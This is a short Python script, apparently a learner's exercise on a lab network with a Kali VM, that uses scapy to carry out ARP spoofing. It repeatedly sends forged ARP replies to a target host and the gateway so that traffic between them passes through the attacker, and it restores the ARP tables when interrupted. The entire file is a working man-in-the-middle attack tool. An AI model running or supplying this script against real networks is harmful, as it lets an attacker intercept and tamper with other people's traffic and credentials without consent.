#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # dst thanks to scapy.ls
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # return the mac address of the routor
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #  change mac address of the routor (ip 10.0.2.1 here) with the mac address of the VM kali linux
    # verbose to erase messages about packets
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # to be sure we do it 4 times
    scapy.send(packet, count=4, verbose=False)


# man in the middle
target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"
# exception try except
try:
    # count the number of packets
    sent_packets_count = 0
    # loop to make man in the middle permanent
    while True:
        # tell the target that I'm the rooter
        spoof("10.0.2.7", "10.0.2.1")
        # tell the rooter that I'm the target computer
        spoof("10.0.2.1", "10.0.2.7")
        # increase the number of packets by 2
        sent_packets_count = sent_packets_count + 2
        # add , to delete \n
        # add \r to begin anew the line
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        # don't keep on the buffer and print (not at the end of the program)
        sys.stdout.flush()
        # in python3 don't use sys and erase , after the print and od print("\r.....,end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTR + C ... Resetting ARP tables.... Please wait.\n")
    # restore the mac address of the rooter and the target
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
